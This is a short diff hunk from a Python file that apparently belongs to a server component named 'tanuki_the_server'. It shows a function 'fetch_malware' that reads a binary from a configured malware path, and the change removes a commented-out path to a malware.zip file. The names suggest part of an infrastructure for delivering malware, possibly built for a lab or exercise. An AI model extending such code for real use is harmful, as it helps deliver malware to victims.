@@ -64,7 +64,7 @@ def calculate_aes_key(dh_key):
 
 def fetch_malware():
     exe_path = MALWARE_PATH
-    # exe_path = ".\\tanuki_the_server\\malware.zip"
+
     with open(exe_path, 'rb') as f:
         binary_data = f.read()
         return binary_data
